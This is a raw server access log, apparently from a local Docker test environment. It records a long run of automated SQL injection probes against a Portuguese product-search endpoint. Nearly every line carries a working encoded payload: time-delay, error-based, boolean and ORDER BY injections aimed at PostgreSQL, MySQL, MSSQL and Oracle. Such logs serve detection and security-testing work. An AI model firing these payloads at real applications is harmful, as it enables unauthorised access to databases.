api-1  | Servidor rodando em http://0.0.0.0:8000
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F9282%3D%28SELECT%2F%2A%2A%2FUPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%289282%3D9282%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29&categoria=eletronicos HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F9282%3D%28SELECT%2F%2A%2A%2FUPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%289282%3D9282%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL%29--%2F%2A%2A%2FAcBC&categoria=eletronicos HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=%28SELECT%2F%2A%2A%2FCONCAT%28CONCAT%28%27qzqkq%27%2C%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%287115%3D7115%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F%271%27%2F%2A%2A%2FELSE%2F%2A%2A%2F%270%27%2F%2A%2A%2FEND%29%29%2C%27qvxjq%27%29%29&categoria=eletronicos HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%27%29%3BSELECT%2F%2A%2A%2FPG_SLEEP%285%29--&categoria=eletronicos HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%27%3BSELECT%2F%2A%2A%2FPG_SLEEP%285%29--&categoria=eletronicos HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%29%3BSELECT%2F%2A%2A%2FPG_SLEEP%285%29--&categoria=eletronicos HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%3BSELECT%2F%2A%2A%2FPG_SLEEP%285%29--&categoria=eletronicos HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%27%29%3BWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27--&categoria=eletronicos HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%27%3BWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27--&categoria=eletronicos HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%29%3BWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27--&categoria=eletronicos HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%3BWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27--&categoria=eletronicos HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%27%29%3BSELECT%2F%2A%2A%2FDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2889%29%7C%7CCHR%28120%29%7C%7CCHR%2882%29%7C%7CCHR%2883%29%2C5%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL--&categoria=eletronicos HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%27%3BSELECT%2F%2A%2A%2FDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2889%29%7C%7CCHR%28120%29%7C%7CCHR%2882%29%7C%7CCHR%2883%29%2C5%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL--&categoria=eletronicos HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%29%3BSELECT%2F%2A%2A%2FDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2889%29%7C%7CCHR%28120%29%7C%7CCHR%2882%29%7C%7CCHR%2883%29%2C5%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL--&categoria=eletronicos HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%3BSELECT%2F%2A%2A%2FDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2889%29%7C%7CCHR%28120%29%7C%7CCHR%2882%29%7C%7CCHR%2883%29%2C5%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL--&categoria=eletronicos HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F4308%2F%2A%2A%2FFROM%2F%2A%2A%2F%28SELECT%28SLEEP%285%29%29%29NatY%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27EOyB%27%3D%27EOyB&categoria=eletronicos HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F4308%2F%2A%2A%2FFROM%2F%2A%2A%2F%28SELECT%28SLEEP%285%29%29%29NatY%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27EOzp%27%3D%27EOzp&categoria=eletronicos HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F4308%2F%2A%2A%2FFROM%2F%2A%2A%2F%28SELECT%28SLEEP%285%29%29%29NatY%29%2F%2A%2A%2FAND%2F%2A%2A%2F%282213%3D2213&categoria=eletronicos HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F4308%2F%2A%2A%2FFROM%2F%2A%2A%2F%28SELECT%28SLEEP%285%29%29%29NatY%29&categoria=eletronicos HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F4308%2F%2A%2A%2FFROM%2F%2A%2A%2F%28SELECT%28SLEEP%285%29%29%29NatY%29--%2F%2A%2A%2FjCvT&categoria=eletronicos HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F1780%3D%28SELECT%2F%2A%2A%2F1780%2F%2A%2A%2FFROM%2F%2A%2A%2FPG_SLEEP%285%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27kKTj%27%3D%27kKTj&categoria=eletronicos HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2F1780%3D%28SELECT%2F%2A%2A%2F1780%2F%2A%2A%2FFROM%2F%2A%2A%2FPG_SLEEP%285%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27Dnma%27%3D%27Dnma&categoria=eletronicos HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2F1780%3D%28SELECT%2F%2A%2A%2F1780%2F%2A%2A%2FFROM%2F%2A%2A%2FPG_SLEEP%285%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%285960%3D5960&categoria=eletronicos HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F1780%3D%28SELECT%2F%2A%2A%2F1780%2F%2A%2A%2FFROM%2F%2A%2A%2FPG_SLEEP%285%29%29&categoria=eletronicos HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F1780%3D%28SELECT%2F%2A%2A%2F1780%2F%2A%2A%2FFROM%2F%2A%2A%2FPG_SLEEP%285%29%29--%2F%2A%2A%2Fyfey&categoria=eletronicos HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%27%29%2F%2A%2A%2FWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27LdeJ%27%3D%27LdeJ&categoria=eletronicos HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27%2F%2A%2A%2FAND%2F%2A%2A%2F%27ZpUz%27%3D%27ZpUz&categoria=eletronicos HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%29%2F%2A%2A%2FWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27%2F%2A%2A%2FAND%2F%2A%2A%2F%285127%3D5127&categoria=eletronicos HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%2F%2A%2A%2FWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27&categoria=eletronicos HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%2F%2A%2A%2FWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27--%2F%2A%2A%2FniQK&categoria=eletronicos HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F2693%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2876%29%7C%7CCHR%28121%29%7C%7CCHR%2876%29%7C%7CCHR%28108%29%2C5%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27QGks%27%3D%27QGks&categoria=eletronicos HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2F2693%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2876%29%7C%7CCHR%28121%29%7C%7CCHR%2876%29%7C%7CCHR%28108%29%2C5%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27PFMo%27%3D%27PFMo&categoria=eletronicos HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2F2693%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2876%29%7C%7CCHR%28121%29%7C%7CCHR%2876%29%7C%7CCHR%28108%29%2C5%29%2F%2A%2A%2FAND%2F%2A%2A%2F%285432%3D5432&categoria=eletronicos HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F2693%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2876%29%7C%7CCHR%28121%29%7C%7CCHR%2876%29%7C%7CCHR%28108%29%2C5%29&categoria=eletronicos HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F2693%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2876%29%7C%7CCHR%28121%29%7C%7CCHR%2876%29%7C%7CCHR%28108%29%2C5%29--%2F%2A%2A%2FBHTh&categoria=eletronicos HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%27%29%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F1--%2F%2A%2A%2FATWu&categoria=eletronicos HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%27%29%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F3469--%2F%2A%2A%2FfayE&categoria=eletronicos HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F1--%2F%2A%2A%2FcrjP&categoria=eletronicos HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F6749--%2F%2A%2A%2FpUuO&categoria=eletronicos HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%29%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F1--%2F%2A%2A%2FRHvM&categoria=eletronicos HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%29%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F4085--%2F%2A%2A%2FIWrv&categoria=eletronicos HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F1--%2F%2A%2A%2FDBjJ&categoria=eletronicos HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F2640--%2F%2A%2A%2FTOnP&categoria=eletronicos HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F1--%2F%2A%2A%2FnmWj&categoria=eletronicos HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F9905--%2F%2A%2A%2FWrHV&categoria=eletronicos HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste&categoria=3887 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste&categoria=eletronicos%22%2C.%27%29%2C.%28%29%28 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste&categoria=eletronicos%27NCisay%3C%27%22%3EzbusMz HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste&categoria=eletronicos HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste&categoria=eletronicos%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F7454%3D5760%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27YBYT%27%3D%27YBYT HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste&categoria=eletronicos%27%2F%2A%2A%2FAND%2F%2A%2A%2F4435%3D3005%2F%2A%2A%2FAND%2F%2A%2A%2F%27YjGx%27%3D%27YjGx HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste&categoria=eletronicos%29%2F%2A%2A%2FAND%2F%2A%2A%2F4908%3D2204%2F%2A%2A%2FAND%2F%2A%2A%2F%281561%3D1561 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste&categoria=eletronicos%2F%2A%2A%2FAND%2F%2A%2A%2F6864%3D5283 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste&categoria=eletronicos%2F%2A%2A%2FAND%2F%2A%2A%2F5081%3D2321--%2F%2A%2A%2FdhnN HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste&categoria=%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%289299%3D4551%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F%27eletronicos%27%2F%2A%2A%2FELSE%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F4551%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2F6448%29%2F%2A%2A%2FEND%29%29 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste&categoria=eletronicos%27%29%2F%2A%2A%2FAND%2F%2A%2A%2FEXTRACTVALUE%284902%2CCONCAT%280x5c%2C0x717a716b71%2C%28SELECT%2F%2A%2A%2F%28ELT%284902%3D4902%2C1%29%29%29%2C0x7176786a71%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27Jvjf%27%3D%27Jvjf HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste&categoria=eletronicos%27%2F%2A%2A%2FAND%2F%2A%2A%2FEXTRACTVALUE%284902%2CCONCAT%280x5c%2C0x717a716b71%2C%28SELECT%2F%2A%2A%2F%28ELT%284902%3D4902%2C1%29%29%29%2C0x7176786a71%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27ucwb%27%3D%27ucwb HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste&categoria=eletronicos%29%2F%2A%2A%2FAND%2F%2A%2A%2FEXTRACTVALUE%284902%2CCONCAT%280x5c%2C0x717a716b71%2C%28SELECT%2F%2A%2A%2F%28ELT%284902%3D4902%2C1%29%29%29%2C0x7176786a71%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%289416%3D9416 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste&categoria=eletronicos%2F%2A%2A%2FAND%2F%2A%2A%2FEXTRACTVALUE%284902%2CCONCAT%280x5c%2C0x717a716b71%2C%28SELECT%2F%2A%2A%2F%28ELT%284902%3D4902%2C1%29%29%29%2C0x7176786a71%29%29 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste&categoria=eletronicos%2F%2A%2A%2FAND%2F%2A%2A%2FEXTRACTVALUE%284902%2CCONCAT%280x5c%2C0x717a716b71%2C%28SELECT%2F%2A%2A%2F%28ELT%284902%3D4902%2C1%29%29%29%2C0x7176786a71%29%29--%2F%2A%2A%2FRvJH HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste&categoria=eletronicos%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F2566%3DCAST%28%28CHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%282566%3D2566%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%29%2F%2A%2A%2FAS%2F%2A%2A%2FNUMERIC%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27PtRE%27%3D%27PtRE HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste&categoria=eletronicos%27%2F%2A%2A%2FAND%2F%2A%2A%2F2566%3DCAST%28%28CHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%282566%3D2566%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%29%2F%2A%2A%2FAS%2F%2A%2A%2FNUMERIC%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27vJgP%27%3D%27vJgP HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste&categoria=eletronicos%29%2F%2A%2A%2FAND%2F%2A%2A%2F2566%3DCAST%28%28CHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%282566%3D2566%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%29%2F%2A%2A%2FAS%2F%2A%2A%2FNUMERIC%29%2F%2A%2A%2FAND%2F%2A%2A%2F%285427%3D5427 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste&categoria=eletronicos%2F%2A%2A%2FAND%2F%2A%2A%2F2566%3DCAST%28%28CHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%282566%3D2566%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%29%2F%2A%2A%2FAS%2F%2A%2A%2FNUMERIC%29 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste&categoria=eletronicos%2F%2A%2A%2FAND%2F%2A%2A%2F2566%3DCAST%28%28CHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%282566%3D2566%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F1%2F%2A%2A%2FELSE%2F%2A%2A%2F0%2F%2A%2A%2FEND%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%29%2F%2A%2A%2FAS%2F%2A%2A%2FNUMERIC%29--%2F%2A%2A%2FesYm HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste&categoria=eletronicos%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F2179%2F%2A%2A%2FIN%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F%28CHAR%28113%29%2BCHAR%28122%29%2BCHAR%28113%29%2BCHAR%28107%29%2BCHAR%28113%29%2B%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%282179%3D2179%29%2F%2A%2A%2FTHEN%2F%2A%2A%2FCHAR%2849%29%2F%2A%2A%2FELSE%2F%2A%2A%2FCHAR%2848%29%2F%2A%2A%2FEND%29%29%2BCHAR%28113%29%2BCHAR%28118%29%2BCHAR%28120%29%2BCHAR%28106%29%2BCHAR%28113%29%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27HfCA%27%3D%27HfCA HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste&categoria=eletronicos%27%2F%2A%2A%2FAND%2F%2A%2A%2F2179%2F%2A%2A%2FIN%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F%28CHAR%28113%29%2BCHAR%28122%29%2BCHAR%28113%29%2BCHAR%28107%29%2BCHAR%28113%29%2B%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%282179%3D2179%29%2F%2A%2A%2FTHEN%2F%2A%2A%2FCHAR%2849%29%2F%2A%2A%2FELSE%2F%2A%2A%2FCHAR%2848%29%2F%2A%2A%2FEND%29%29%2BCHAR%28113%29%2BCHAR%28118%29%2BCHAR%28120%29%2BCHAR%28106%29%2BCHAR%28113%29%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27NZzY%27%3D%27NZzY HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste&categoria=eletronicos%29%2F%2A%2A%2FAND%2F%2A%2A%2F2179%2F%2A%2A%2FIN%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F%28CHAR%28113%29%2BCHAR%28122%29%2BCHAR%28113%29%2BCHAR%28107%29%2BCHAR%28113%29%2B%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%282179%3D2179%29%2F%2A%2A%2FTHEN%2F%2A%2A%2FCHAR%2849%29%2F%2A%2A%2FELSE%2F%2A%2A%2FCHAR%2848%29%2F%2A%2A%2FEND%29%29%2BCHAR%28113%29%2BCHAR%28118%29%2BCHAR%28120%29%2BCHAR%28106%29%2BCHAR%28113%29%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%283029%3D3029 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste&categoria=eletronicos%2F%2A%2A%2FAND%2F%2A%2A%2F2179%2F%2A%2A%2FIN%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F%28CHAR%28113%29%2BCHAR%28122%29%2BCHAR%28113%29%2BCHAR%28107%29%2BCHAR%28113%29%2B%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%282179%3D2179%29%2F%2A%2A%2FTHEN%2F%2A%2A%2FCHAR%2849%29%2F%2A%2A%2FELSE%2F%2A%2A%2FCHAR%2848%29%2F%2A%2A%2FEND%29%29%2BCHAR%28113%29%2BCHAR%28118%29%2BCHAR%28120%29%2BCHAR%28106%29%2BCHAR%28113%29%29%29 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste&categoria=eletronicos%2F%2A%2A%2FAND%2F%2A%2A%2F2179%2F%2A%2A%2FIN%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F%28CHAR%28113%29%2BCHAR%28122%29%2BCHAR%28113%29%2BCHAR%28107%29%2BCHAR%28113%29%2B%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%282179%3D2179%29%2F%2A%2A%2FTHEN%2F%2A%2A%2FCHAR%2849%29%2F%2A%2A%2FELSE%2F%2A%2A%2FCHAR%2848%29%2F%2A%2A%2FEND%29%29%2BCHAR%28113%29%2BCHAR%28118%29%2BCHAR%28120%29%2BCHAR%28106%29%2BCHAR%28113%29%29%29--%2F%2A%2A%2FLtZZ HTTP/1.1
